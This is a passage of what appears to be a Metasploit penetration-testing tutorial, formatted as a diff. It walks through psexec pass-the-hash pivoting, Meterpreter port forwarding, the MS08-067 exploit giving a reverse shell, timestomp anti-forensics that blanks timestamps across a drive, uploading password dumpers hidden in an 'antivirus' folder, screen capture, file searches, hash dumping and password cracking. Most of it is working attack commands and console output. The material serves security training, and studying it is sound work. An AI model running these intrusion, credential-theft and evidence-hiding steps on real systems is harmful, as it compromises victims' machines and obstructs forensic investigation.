+ [*] Scanned 256 of 256 hosts (100% complete)
+ [*] Auxiliary module execution completed
+ msf auxiliary(tcp) >
+
+
+We have discovered an additional machine on this network with ports 139 and 445 open so we will try to re-use our gathered password hash with the psexec exploit module. Since many companies use imaging software, the local Administrator password is frequently the same across the entire enterprise.
+
+::
+
+  msf auxiliary(tcp) > use exploit/windows/smb/psexec
+ msf exploit(psexec) > show options
+
+ Module options:
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOST                       yes       The target address
+   RPORT      445              yes       Set the SMB service port
+   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication
+   SMBPass                     no        The password for the specified username
+   SMBUser                     no        The username to authenticate as
+
+
+ Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+ msf exploit(psexec) > set RHOST 10.1.13.2
+ RHOST => 10.1.13.2
+ msf exploit(psexec) > set SMBUser Administrator
+ SMBUser => Administrator
+ msf exploit(psexec) > set SMBPass 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
+ SMBPass => 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
+ msf exploit(psexec) > set PAYLOAD windows/meterpreter/bind_tcp
+ PAYLOAD => windows/meterpreter/bind_tcp
+ msf exploit(psexec) > exploit
+
+ [*] Connecting to the server...
+ [*] Started bind handler
+ [*] Authenticating to 10.1.13.2:445|WORKGROUP as user 'Administrator'...
+ [*] Uploading payload...
+ [*] Created \qNuIKByV.exe...
+ [*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.1.13.2[\svcctl] ...
+ [*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.1.13.2[\svcctl] ...
+ [*] Obtaining a service manager handle...
+ [*] Creating a new service (UOtrbJMd - "MNYR")...
+ [*] Closing service handle...
+ [*] Opening service...
+ [*] Starting the service...
+ [*] Removing the service...
+ [*] Closing service handle...
+ [*] Deleting \qNuIKByV.exe...
+ [*] Sending stage (749056 bytes)
+ [*] Meterpreter session 2 opened (192.168.1.101-192.168.1.201:0 -> 10.1.13.2:4444) at Mon Dec 06 08:56:42 -0700 2010
+
+ meterpreter >
+
+
+Our attack has been successful! You can see in the above output that we have a meterpreter session connecting to 10.1.13.2 via our existing meterpreter session with 192.168.1.201. Running ipconfig on our newly compromised machine shows that we have reached a system that is not normally accessible to us.
+
+::
+
+  meterpreter > ipconfig
+
+ Citrix XenServer PV Ethernet Adapter
+ Hardware MAC: 22:73:ff:12:11:4b
+ IP Address  : 10.1.13.2
+ Netmask     : 255.255.255.0
+
+
+
+ MS TCP Loopback interface
+ Hardware MAC: 00:00:00:00:00:00
+ IP Address  : 127.0.0.1
+ Netmask     : 255.0.0.0
+
+
+ meterpreter >
+
+
+As you can see, pivoting is an extremely powerful feature and is a critical capability to have on penetration tests.
+
+Portfwd
+^^^^^^^^^^
+
+The portfwd command from within the Meterpreter shell is most commonly used as a pivoting technique, allowing direct access to machines otherwise inaccessible from the attacking system. Running this command on a compromised host with access to both the attacker and destination network (or system), we can essentially forward TCP connections through this machine, effectively making it a pivot point. Much like the port forwarding technique used with an ssh connection, portfwd will relay TCP connections to and from the connected machines.
+
+Help
+""""
+
+From an active Meterpreter session, typing portfwd –h will display the command’s various options and arguments.
+
+::
+
+  meterpreter > portfwd -h
+ Usage: portfwd [-h] [add | delete | list | flush] [args]
+ OPTIONS:
+     -L >opt>  The local host to listen on (optional).
+     -h        Help banner.
+     -l >opt>  The local port to listen on.
+     -p >opt>  The remote port to connect on.
+     -r >opt>  The remote host to connect on.
+ meterpreter >
+
+
+**Options**
+
+* -L: Use to specify the listening host. Unless you need the forwarding to occur on a specific network adapter you can omit this option.If none is entered 0.0.0.0 will be used.
+* -h: Displays the above information.
+* -l: This is a local port which will listen on the attacking machine.Connections to this port will be forwarded to the remote system.
+* -p: The port to which TCP connections will be forward to.
+* -r: The IP address the connections are relayed to (target).
+
+**Arguments**
+
+* Add: This argument is used to create the forwarding.
+* Delete: This will delete a previous entry from our list of forwarded ports.
+* List: This will list all ports currently forwarded.
+* Flush: This will delete all ports from our forwarding list.
+
+**Syntax**
+
+Add
+
+From the Meterpreter shell, the command is used in the following manner:
+
+::
+
+  meterpreter > portfwd add –l 3389 –p 3389 –r  [target host]
+
+* add will add the port forwarding to the list and will essentially create a tunnel for us. Please note, this tunnel will also exist outside the Metasploit console, making it available to any terminal session.
+* -l 3389 is the local port that will be listening and forwarded to our target. This can be any port on your machine, as long as it’s not already being used.
+* -p 3389 is the destination port on our targeting host.
+* -r [target host] is the our targeted system’s IP or hostname.
+
+::
+
+  meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.191
+ [*] Local TCP relay created: 0.0.0.0:3389 >-> 172.16.194.191:3389
+ meterpreter >
+
+
+Delete
+
+Entries are deleted very much like the previous command. Once again from an active Meterpreter session, we would type the following:
+
+::
+
+  meterpreter > portfwd delete –l 3389 –p 3389 –r [target host]
+
+
+::
+
+  meterpreter > portfwd delete –l 3389 –p 3389 –r 172.16.194.191
+ [*] Successfully stopped TCP relay on 0.0.0.0:3389
+ meterpreter >
+
+LIST
+
+ This argument needs no options and provides us with a list of currently listening and forwarded ports.
+
+::
+
+  meterpreter > portfwd list
+ 0: 0.0.0.0:3389 -> 172.16.194.191:3389
+ 1: 0.0.0.0:1337 -> 172.16.194.191:1337
+ 2: 0.0.0.0:2222 -> 172.16.194.191:2222
+
+ 3 total local port forwards.
+ meterpreter >
+
+
+FLUSH
+
+ This argument will allow us to remove all the local port forward at once.
+
+::
+
+  meterpreter > portfwd flush
+ [*] Successfully stopped TCP relay on 0.0.0.0:3389
+ [*] Successfully stopped TCP relay on 0.0.0.0:1337
+ [*] Successfully stopped TCP relay on 0.0.0.0:2222
+ [*] Successfully flushed 3 rules
+ meterpreter > portfwd list
+
+ 0 total local port forwards
+ meterpreter >
+
+
+Example Usage:
+
+In this example, we will open a port on our local machine and have our Meterpreter session forward a connection to our victim on that same port. We’ll be using port 3389, which is the Windows default port for Remote Desktop connections.
+
+Here are the players involved:
+
+::
+
+  C:\> ipconfig
+
+ Windows IP Configuration
+
+ Ethernet adapter Local Area Connection 3:
+
+   Connection-specific DNS Suffix . : localdomain
+   IP Address.  .  .  .  .  .  .  .  . 172.16.194.141
+   Subnet Mask.  .  . .  .  .  .  .  . 255.255.255.0
+   Default Gateway. . .  .  .  .  .  . 172.16.194.2
+
+ C:\>
+
+::
+
+  meterpreter > ipconfig
+
+ MS TCP Loopback interface
+ Hardware MAC: 00:00:00:00:00:00
+ IP Address  : 127.0.0.1
+ Netmask     : 255.0.0.0
+
+
+
+ VMware Accelerated AMD PCNet Adapter - Packet Scheduler Miniport
+ Hardware MAC: 00:aa:00:aa:00:aa
+ IP Address  : 172.16.194.144
+ Netmask     : 255.0.0.0
+
+
+
+ AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport
+ Hardware MAC: 00:bb:00:bb:00:bb
+ IP Address  : 192.168.1.191
+ Netmask     : 255.0.0.0
+
+
+::
+
+  root@kali:~# ifconfig eth1
+ eth1     Link encap:Ethernet  HWaddr 0a:0b:0c:0d:0e:0f
+         inet addr:192.168.1.162  Bcast:192.168.1.255  Mask:255.255.255.0
+         inet6 addr: fe80::20c:29ff:fed6:ab38/64 Scope:Link
+         UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+         RX packets:1357685 errors:0 dropped:0 overruns:0 frame:0
+         TX packets:823428 errors:0 dropped:0 overruns:0 carrier:0
+         collisions:0 txqueuelen:1000
+         RX bytes:318385612 (303.6 MiB)  TX bytes:133752114 (127.5 MiB)
+         Interrupt:19 Base address:0x2000
+
+ root@kali:~# ping 172.16.194.141
+ PING 172.16.194.141 (172.16.194.141) 56(84) bytes of data.
+ 64 bytes from 172.16.194.141: icmp_req=1 ttl=128 time=240 ms
+ 64 bytes from 172.16.194.141: icmp_req=2 ttl=128 time=117 ms
+ 64 bytes from 172.16.194.141: icmp_req=3 ttl=128 time=119 ms
+ ^C
+ --- 172.16.194.141 ping statistics ---
+ 3 packets transmitted, 3 received, 0% packet loss, time 2003ms
+ rtt min/avg/max/mdev = 117.759/159.378/240.587/57.430 ms
+
+ root@kali:~#
+
+
+First we setup the port forwarding on our pivot using the following command:
+
+
+::
+
+  meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
+
+We verify that port 3389 is listening by issuing the netstat command from another terminal.
+
+::
+
+  root@kali:~# netstat -antp
+ Active Internet connections (servers and established)
+ Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+ tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      8397/sshd
+ .....
+ tcp        0      0 0.0.0.0:3389            0.0.0.0:*               LISTEN      2045/.ruby.bin
+ .....
+ tcp6       0      0 :::22                   :::*                    LISTEN      8397/sshd
+ root@kali:~#
+
+
+We can see 0.0.0.0 is listening on port 3389 as well as the connection to our pivot machine on port 4444.
+
+From here, we can initiate a remote desktop connection to our local 3389 port. Which will be forwarded to our victim machine on the corresponding port.
+
+Another example of portfwd usage is using it to forward exploit modules such as “MS08-067”.
+Using the same technique as show previously, it’s just a matter of forwarding the correct ports for the
+desired exploit.
+
+Here we forwarded port 445, which is the port associated with Windows Server Message Block (SMB).
+Configuring our module target host and port to our forwarded socket. The exploit is sent via our pivot to the victim machine.
+
+
+::
+
+  msf exploit(ms08_067_netapi) > show options
+
+ Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST    127.0.0.1        yes       The target address
+   RPORT    445              yes       Set the SMB service port
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+ Payload options (windows/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (accepted: seh, thread, process, none)
+   LHOST     192.168.1.162    yes       The listen address
+   LPORT     4444             yes       The listen port
+
+
+ Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+
+ msf exploit(ms08_067_netapi) > exploit
+
+ [*] Started reverse handler on 192.168.1.162:4444
+ [*] Automatically detecting the target...
+ [*] Fingerprint: Windows 2003 - Service Pack 2 - lang:Unknown
+ [*] We could not detect the language pack, defaulting to English
+ [*] Selected Target: Windows 2003 SP2 English (NX)
+ [*] Attempting to trigger the vulnerability...
+ [*] Sending stage (240 bytes) to 192.168.1.159
+ [-] Exploit exception: Stream # is closed.
+
+ Microsoft Windows [Version 5.2.3790]
+ (C) Copyright 1985-2003 Microsoft Corp.
+
+ C:\WINDOWS\system32>
+
+
+TimeStomp
+========
+
+Interacting with most file systems is like walking in the snow…you will leave footprints. How detailed those footprints are, how much can be learned from them, and how long they last all depends on various circumstances. The art of analyzing these artifacts is digital forensics. For various reasons, when conducting a penetration test you may want to make it hard for a forensic analyst to determine the actions that you took.
+
+The best way to avoid detection by a forensic investigation is simple: Don’t touch the filesystem! This is one of the beautiful things about Meterpreter, it loads into memory without writing anything to disk, greatly minimizing the artifacts it leaves on a system. However, in many cases you may have to interact with the filesystem in some way. In those cases timestomp can be a great tool.
+
+Let’s look at a file on the system and the MAC (Modified, Accessed, Changed) times of the file:
+
+::
+
+  File Path: C:\Documents and Settings\P0WN3D\My Documents\test.txt
+ Created Date: 5/3/2009 2:30:08 AM
+ Last Accessed: 5/3/2009 2:31:39 AM
+ Last Modified: 5/3/2009 2:30:36 AM
+
+We will now start by exploiting the system and loading up a Meterpreter session. After that, we will load the timestomp module and take a quick look at the file in question.
+
+::
+
+  msf exploit(warftpd_165_user) > exploit
+
+ [*] Handler binding to LHOST 0.0.0.0
+ [*] Started reverse handler
+ [*] Connecting to FTP server 172.16.104.145:21...
+ [*] Connected to target FTP server.
+ [*] Trying target Windows 2000 SP0-SP4 English...
+ [*] Transmitting intermediate stager for over-sized stage...(191 bytes)
+ [*] Sending stage (2650 bytes)
+ [*] Sleeping before handling stage...
+ [*] Uploading DLL (75787 bytes)...
+ [*] Upload completed.
+ [*] meterpreter session 1 opened (172.16.104.130:4444 -> 172.16.104.145:1218)
+ meterpreter > use priv
+ Loading extension priv...success.
+ meterpreter > timestomp -h
+
+ Usage: timestomp OPTIONS file_path
+
+ OPTIONS:
+
+    -a   Set the "last accessed" time of the file
+    -b        Set the MACE timestamps so that EnCase shows blanks
+    -c   Set the "creation" time of the file
+    -e   Set the "mft entry modified" time of the file
+    -f   Set the MACE of attributes equal to the supplied file
+    -h        Help banner
+    -m   Set the "last written" time of the file
+    -r        Set the MACE timestamps recursively on a directory
+    -v        Display the UTC MACE values of the file
+    -z   Set all four attributes (MACE) of the file
+
+ meterpreter > pwd
+ C:\Program Files\War-ftpd
+ meterpreter > cd ..
+ meterpreter > pwd
+ C:Program Files
+ meterpreter > cd ..
+ meterpreter > cd Documents\ and\ Settings
+ meterpreter > cd P0WN3D
+ meterpreter > cd My\ Documents
+ meterpreter > ls
+
+ Listing: C:\Documents and Settings\P0WN3D\My Documents
+ ======================================================
+
+ Mode              Size  Type  Last modified                   Name
+ ----              ----  ----  -------------                   ----
+ 40777/rwxrwxrwx   0     dir   Wed Dec 31 19:00:00 -0500 1969  .
+ 40777/rwxrwxrwx   0     dir   Wed Dec 31 19:00:00 -0500 1969  ..
+ 40555/r-xr-xr-x   0     dir   Wed Dec 31 19:00:00 -0500 1969  My Pictures
+ 100666/rw-rw-rw-  28    fil   Wed Dec 31 19:00:00 -0500 1969  test.txt
+ meterpreter > timestomp test.txt -v
+ Modified      : Sun May 03 04:30:36 -0400 2009
+ Accessed      : Sun May 03 04:31:51 -0400 2009
+ Created       : Sun May 03 04:30:08 -0400 2009
+ Entry Modified: Sun May 03 04:31:44 -0400 2009
+
+
+Let’s look at the MAC times displayed. We see that the file was created recently. Let’s pretend for a minute that this is a super secret tool that we need to hide. One way to do this might be to set the MAC times to match the MAC times of another file on the system. Let’s copy the MAC times from cmd.exe to test.txt to make it blend in a little better.
+
+::
+
+  meterpreter > timestomp test.txt -f C:\\WINNT\\system32\\cmd.exe
+ [*] Setting MACE attributes on test.txt from C:\WINNT\system32\cmd.exe
+ meterpreter > timestomp test.txt -v
+ Modified      : Tue Dec 07 08:00:00 -0500 1999
+ Accessed      : Sun May 03 05:14:51 -0400 2009
+ Created       : Tue Dec 07 08:00:00 -0500 1999
+ Entry Modified: Sun May 03 05:11:16 -0400 2009
+
+
+There we go! Now it looks as if the text.txt file was created on Dec 7th, 1999. Let’s see how it looks from Windows.
+
+::
+
+  File Path: C:\Documents and Settings\P0WN3D\My Documents\test.txt
+ Created Date: 12/7/1999 7:00:00 AM
+ Last Accessed: 5/3/2009 3:11:16 AM
+ Last Modified: 12/7/1999 7:00:00 AM
+
+
+Success! Notice there are some slight differences between the times through Windows and Metasploit. This is due to the way the timezones are displayed. Windows is displaying the time in -0600, while Metasploit shows the MC times as -0500. When adjusted for the timezone differences, we can see that they match. Also notice that the act of checking the files information within Windows altered the last accessed time. This just goes to show how fragile MAC times can be, and why great care has to be taken when interacting with them.
+
+Let’s now make a different change. In the previous example, we were looking to make the changes blend in but in some cases, this just isn’t realistic and the best you can hope for is to make it harder for an investigator to identify when changes actually occurred. For those situations, timestomp has a great option (-b for blank) where it zeros out the MAC times for a file. Let’s take a look.
+
+::
+
+  meterpreter > timestomp test.txt -v
+ Modified      : Tue Dec 07 08:00:00 -0500 1999
+ Accessed      : Sun May 03 05:16:20 -0400 2009
+ Created       : Tue Dec 07 08:00:00 -0500 1999
+ Entry Modified: Sun May 03 05:11:16 -0400 2009
+
+ meterpreter > timestomp test.txt -b
+ [*] Blanking file MACE attributes on test.txt
+ meterpreter > timestomp test.txt -v
+ Modified      : 2106-02-06 23:28:15 -0700
+ Accessed      : 2106-02-06 23:28:15 -0700
+ Created       : 2106-02-06 23:28:15 -0700
+ Entry Modified: 2106-02-06 23:28:15 -0700
+
+
+When parsing the MAC times, timestomp now lists them as having been created in the year 2106!. This is very interesting, as some poorly written forensic tools have the same problem, and will crash when coming across entries like this. Let’s see how the file looks in Windows.
+
+::
+
+  File Path: C:\Documents and Settings\P0WN3D\My Documents\test.txt
+ Created Date: 1/1/1601
+ Last Accessed: 5/3/2009 3:21:13 AM
+ Last Modified: 1/1/1601
+
+Very interesting! Notice that times are no longer displayed, and the data is set to Jan 1, 1601. Any idea why that might be the case? (Hint: http://en.wikipedia.org/wiki/1601#Notes)
+
+::
+
+  meterpreter > cd C:\\WINNT
+ meterpreter > mkdir antivirus
+ Creating directory: antivirus
+ meterpreter > cd antivirus
+ meterpreter > pwd
+ C:\WINNT\antivirus
+ meterpreter > upload /usr/share/windows-binaries/fgdump c:\\WINNT\\antivirus\\
+ [*] uploading  : /usr/share/windows-binaries/fgdump/servpw.exe -> c:WINNTantivirusPwDump.exe
+ [*] uploaded   : /usr/share/windows-binaries/fgdump/servpw.exe -> c:WINNTantivirusPwDump.exe
+ [*] uploading  : /usr/share/windows-binaries/fgdump/cachedump64.exe -> c:WINNTantivirusLsaExt.dll
+ [*] uploaded   : /usr/share/windows-binaries/fgdump/cachedump64.exe -> c:WINNTantivirusLsaExt.dll
+ [*] uploading  : /usr/share/windows-binaries/fgdump/pstgdump.exe -> c:WINNTantiviruspwservice.exe
+ [*] uploaded   : /usr/share/windows-binaries/fgdump/pstgdump.exe -> c:WINNTantiviruspwservice.exe
+ meterpreter > ls
+
+ Listing: C:\WINNT\antivirus
+ ===========================
+
+ Mode              Size    Type  Last modified                   Name
+ ----              ----    ----  -------------                   ----
+ 100777/rwxrwxrwx  174080  fil   2017-05-09 15:23:19 -0600  cachedump64.exe
+ 100777/rwxrwxrwx  57344   fil   2017-05-09 15:23:20 -0600  pstgdump.exe
+ 100777/rwxrwxrwx  57344   fil   2017-05-09 15:23:18 -0600  servpw.exe
+ meterpreter > cd ..
+
+
+With our files uploaded, we will now run timestomp on the them to confuse any potential investigator.
+
+
+::
+
+  meterpreter > timestomp antivirus\\servpw.exe -v
+ Modified      : 2017-05-09 16:23:18 -0600
+ Accessed      : 2017-05-09 16:23:18 -0600
+ Created       : 2017-05-09 16:23:18 -0600
+ Entry Modified: 2017-05-09 16:23:18 -0600
+ meterpreter > timestomp antivirus\\pstgdump.exe -v
+ Modified      : 2017-05-09 16:23:20 -0600
+ Accessed      : 2017-05-09 16:23:19 -0600
+ Created       : 2017-05-09 16:23:19 -0600
+ Entry Modified: 2017-05-09 16:23:20 -0600
+ meterpreter > timestomp antivirus -r
+ [*] Blanking directory MACE attributes on antivirus
+
+ meterpreter > ls
+ 40777/rwxrwxrwx   0      dir   1980-01-01 00:00:00 -0700  ..
+ 100666/rw-rw-rw-  115    fil   2106-02-06 23:28:15 -0700  servpw.exe
+ 100666/rw-rw-rw-  12165  fil   2106-02-06 23:28:15 -0700  pstgdump.exe
+
+As you can see, Meterpreter can no longer get a proper directory listing.
+
+However, there is something to consider in this case. We have hidden when an action occurred, yet it will still be very obvious to an investigator where activity was happening. What would we do if we wanted to hide both when a toolkit was uploaded, and where it was uploaded?
+
+The easiest way to approach this is to zero out the times on the full drive. This will make the job of the investigator very difficult, as traditional timeline analysis will not be possible. Let’s first look at our WINNT\system32 directory.
+
+.. image:: img\Timestomp_01.png
+
+Everything looks normal. Now, let’s shake the filesystem up really bad!
+
+::
+
+  meterpreter > pwd
+ C:WINNT\antivirus
+ meterpreter > cd ../..
+ meterpreter > pwd
+ C:
+ meterpreter > ls
+
+ Listing: C:\
+ ============
+
+ Mode              Size       Type  Last modified                   Name
+ ----              ----       ----  -------------                   ----
+ 100777/rwxrwxrwx  0          fil   Wed Dec 31 19:00:00 -0500 1969  AUTOEXEC.BAT
+ 100666/rw-rw-rw-  0          fil   Wed Dec 31 19:00:00 -0500 1969  CONFIG.SYS
+ 40777/rwxrwxrwx   0          dir    Wed Dec 31 19:00:00 -0500 1969  Documents and Settings
+ 100444/r--r--r--  0          fil   Wed Dec 31 19:00:00 -0500 1969  IO.SYS
+ 100444/r--r--r--  0          fil   Wed Dec 31 19:00:00 -0500 1969  MSDOS.SYS
+ 100555/r-xr-xr-x  34468      fil   Wed Dec 31 19:00:00 -0500 1969  NTDETECT.COM
+ 40555/r-xr-xr-x   0          dir   Wed Dec 31 19:00:00 -0500 1969  Program Files
+ 40777/rwxrwxrwx   0          dir   Wed Dec 31 19:00:00 -0500 1969  RECYCLER
+ 40777/rwxrwxrwx   0          dir   Wed Dec 31 19:00:00 -0500 1969  System Volume Information
+ 40777/rwxrwxrwx   0          dir   Wed Dec 31 19:00:00 -0500 1969  WINNT
+ 100555/r-xr-xr-x  148992     fil   Wed Dec 31 19:00:00 -0500 1969  arcldr.exe
+ 100555/r-xr-xr-x  162816     fil   Wed Dec 31 19:00:00 -0500 1969  arcsetup.exe
+ 100666/rw-rw-rw-  192        fil   Wed Dec 31 19:00:00 -0500 1969  boot.ini
+ 100444/r--r--r--  214416     fil   Wed Dec 31 19:00:00 -0500 1969  ntldr
+ 100666/rw-rw-rw-  402653184  fil   Wed Dec 31 19:00:00 -0500 1969  pagefile.sys
+
+ meterpreter > timestomp C:\\ -r
+ [*] Blanking directory MACE attributes on C:\
+ meterpreter > ls
+ meterpreter > ls
+
+ Listing: C:\
+ ============
+
+ Mode              Size       Type  Last modified              Name
+ ----              ----       ----  -------------              ----
+ 100777/rwxrwxrwx  0          fil   2106-02-06 23:28:15 -0700  AUTOEXEC.BAT
+ 100666/rw-rw-rw-  0          fil   2106-02-06 23:28:15 -0700  CONFIG.SYS
+ 100666/rw-rw-rw-  0          fil   2106-02-06 23:28:15 -0700  Documents and Settings
+ 100444/r--r--r--  0          fil   2106-02-06 23:28:15 -0700  IO.SYS
+ 100444/r--r--r--  0          fil   2106-02-06 23:28:15 -0700  MSDOS.SYS
+ 100555/r-xr-xr-x  47564      fil   2106-02-06 23:28:15 -0700  NTDETECT.COM
+ ...snip...
+
+
+So, after that what does Windows see?
+
+.. image:: img\Timestomp_02.png
+
+
+Amazing. Windows has no idea what is going on, and displays crazy times all over the place. Don’t get overconfident however. By taking this action, you have also made it very obvious that some adverse activity has occurred on the system. Also, there are many different sources of timeline information on a Windows system other than just MAC times. If a forensic investigator came across a system that had been modified in this manner, they would be running to these alternative information sources. However, the cost of conducting the investigation just went up.
+
+Screen Capture
+============
+
+Another feature of meterpreter is the ability to capture the victims desktop and save them on your system. Let’s take a quick look at how this works. We’ll already assume you have a meterpreter console, we’ll take a look at what is on the victims screen.
+
+::
+
+  [*] Started bind handler
+ [*] Trying target Windows XP SP2 - English...
+ [*] Sending stage (719360 bytes)
+ [*] Meterpreter session 1 opened (192.168.1.101:34117 -> 192.168.1.104:4444)
+
+ meterpreter > ps
+
+ Process list
+ ============
+
+    PID   Name                 Path
+    ---   ----                 ----
+    180   notepad.exe          C:\WINDOWS\system32\notepad.exe
+    248   snmp.exe             C:\WINDOWS\System32\snmp.exe
+    260   Explorer.EXE         C:\WINDOWS\Explorer.EXE
+    284   surgemail.exe        c:\surgemail\surgemail.exe
+    332   VMwareService.exe    C:\Program Files\VMware\VMware Tools\VMwareService.exe
+    612   VMwareTray.exe       C:\Program Files\VMware\VMware Tools\VMwareTray.exe
+    620   VMwareUser.exe       C:\Program Files\VMware\VMware Tools\VMwareUser.exe
+    648   ctfmon.exe           C:\WINDOWS\system32\ctfmon.exe
+    664   GrooveMonitor.exe    C:\Program Files\Microsoft Office\Office12\GrooveMonitor.exe
+    728   WZCSLDR2.exe         C:\Program Files\ANI\ANIWZCS2 Service\WZCSLDR2.exe
+    736   jusched.exe          C:\Program Files\Java\jre6\bin\jusched.exe
+    756   msmsgs.exe           C:\Program Files\Messenger\msmsgs.exe
+    816   smss.exe             \SystemRoot\System32\smss.exe
+    832   alg.exe              C:\WINDOWS\System32\alg.exe
+    904   csrss.exe            \??\C:\WINDOWS\system32\csrss.exe
+    928   winlogon.exe         \??\C:\WINDOWS\system32\winlogon.exe
+    972   services.exe         C:\WINDOWS\system32\services.exe
+    984   lsass.exe            C:\WINDOWS\system32\lsass.exe
+    1152  vmacthlp.exe         C:\Program Files\VMware\VMware Tools\vmacthlp.exe
+    1164  svchost.exe          C:\WINDOWS\system32\svchost.exe
+    1276  nwauth.exe           c:\surgemail\nwauth.exe
+    1296  svchost.exe          C:\WINDOWS\system32\svchost.exe
+    1404  svchost.exe          C:\WINDOWS\System32\svchost.exe
+    1500  svchost.exe          C:\WINDOWS\system32\svchost.exe
+    1652  svchost.exe          C:\WINDOWS\system32\svchost.exe
+    1796  spoolsv.exe          C:\WINDOWS\system32\spoolsv.exe
+    1912  3proxy.exe           C:\3proxy\bin\3proxy.exe
+    2024  jqs.exe              C:\Program Files\Java\jre6\bin\jqs.exe
+    2188  swatch.exe           c:\surgemail\swatch.exe
+    2444  iexplore.exe         C:\Program Files\Internet Explorer\iexplore.exe
+    3004  cmd.exe              C:\WINDOWS\system32\cmd.exe
+
+ meterpreter > migrate 260
+ [*] Migrating to 260...
+ [*] Migration completed successfully.
+ meterpreter > use espia
+ Loading extension espia...success.
+ meterpreter > screengrab
+ Screenshot saved to: /root/nYdRUppb.jpeg
+ meterpreter >
+
+
+We can see how effective this was in migrating to the explorer.exe, be sure that the process your meterpreter is on has access to active desktops or this will not work.
+
+
+Searching for Content
+=====================
+
+Information leakage is one of the largest threats that corporations face and much of it can be prevented by educating users to properly secure their data. Users being users though, will frequently save data to their local workstations instead of on the corporate servers where there is greater control.
+
+Meterpreter has a search function that will, by default, scour all drives of the compromised computer looking for files of your choosing.
+
+
+::
+
+  meterpreter > search -h
+ Usage: search [-d dir] [-r recurse] -f pattern
+ Search for files.
+
+ OPTIONS:
+
+    -d   The directory/drive to begin searching from. Leave empty to search all drives. (Default: )
+    -f   The file pattern glob to search for. (e.g. *secret*.doc?)
+    -h        Help Banner.
+    -r   Recursivly search sub directories. (Default: true)
+
+
+To run a search for all jpeg files on the computer, simply run the search command with the ‘-f’ switch and tell it what filetype to look for.
+
+::
+
+  meterpreter > search -f *.jpg
+ Found 418 results...
+ ...snip...
+    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Blue hills.jpg (28521 bytes)
+    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Sunset.jpg (71189 bytes)
+    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Water lilies.jpg (83794 bytes)
+    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Winter.jpg (105542 bytes)
+ ...snip...
+
+
+Searching an entire computer can take a great deal of time and there is a chance that an observant user might notice their hard drive thrashing constantly. We can reduce the search time by pointing it at a starting directory and letting it run.
+
+
+::
+
+  meterpreter > search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.pdf
+ Found 2 results...
+    c:\documents and settings\administrator\desktop\operations_plan.pdf (244066 bytes)
+    c:\documents and settings\administrator\desktop\budget.pdf (244066 bytes)
+ meterpreter >
+
+
+By running the search this way, you will notice a huge speed increase in the time it takes to complete.
+
+
+John the Ripper
+=============
+
+The John The Ripper module is used to identify weak passwords that have been acquired as hashed files (loot) or raw LANMAN/NTLM hashes (hashdump). The goal of this module is to find trivial passwords in a short amount of time. To crack complex passwords or use large wordlists, John the Ripper should be used outside of Metasploit. This initial version just handles LM/NTLM credentials from hashdump and uses the standard wordlist and rules.
+
+
+::
+
+  msf auxiliary(handler) > use post/windows/gather/hashdump
+ msf post(hashdump) > set session 1
+ session => 1
+
+ msf post(hashdump) > run
+
+ [*] Obtaining the boot key...
+ [*] Calculating the hboot key using SYSKEY bffad2dcc991597aaa19f90e8bc4ee00...
+ [*] Obtaining the user list and keys...
+ [*] Decrypting user keys...
+ [*] Dumping password hashes...
+
+
+ Administrator:500:cb5f77772e5178b77b9fbd79429286db:b78fe104983b5c754a27c1784544fda7:::
+ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ HelpAssistant:1000:810185b1c0dd86dd756d138f54162df8:7b8f23708aec7107bfdf0925dbb2fed7:::
+ SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:8be4bbf2ad7bd7cec4e1cdddcd4b052e:::
+ rAWjAW:1003:aad3b435b51404eeaad3b435b51404ee:117a2f6059824c686e7a16a137768a20:::
+ rAWjAW2:1004:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+
+
+ [*] Post module execution completed
+
+ msf post(hashdump) > use auxiliary/analyze/jtr_crack_fast
+ msf auxiliary(jtr_crack_fast) > run
+
+ [*] Seeded the password database with 8 words...
+
+ guesses: 3  time: 0:00:00:04 DONE (Sat Jul 16 19:59:04 2011)  c/s: 12951K  trying: WIZ1900 - ZZZ1900
+ Warning: passwords printed above might be partial and not be all those cracked
+ Use the "--show" option to display all of the cracked passwords reliably
+ [*] Output: Loaded 7 password hashes with no different salts (LM DES [128/128 BS SSE2])
+ [*] Output: D                (cred_6:2)
+ [*] Output: PASSWOR          (cred_6:1)
+ [*] Output: GG               (cred_1:2)
+ Warning: mixed-case charset, but the current hash type is case-insensitive;
+ some candidate passwords may be unnecessarily tried more than once.
+ guesses: 1  time: 0:00:00:05 DONE (Sat Jul 16 19:59:10 2011)  c/s: 44256K  trying: ||V} - |||}
+ Warning: passwords printed above might be partial and not be all those cracked
+ Use the "--show" option to display all of the cracked passwords reliably
+ [*] Output: Loaded 7 password hashes with no different salts (LM DES [128/128 BS SSE2])
+ [*] Output: Remaining 4 password hashes with no different salts
+ [*] Output: (cred_2)
+ guesses: 0  time: 0:00:00:00 DONE (Sat Jul 16 19:59:10 2011)  c/s: 6666K  trying: 89093 - 89092
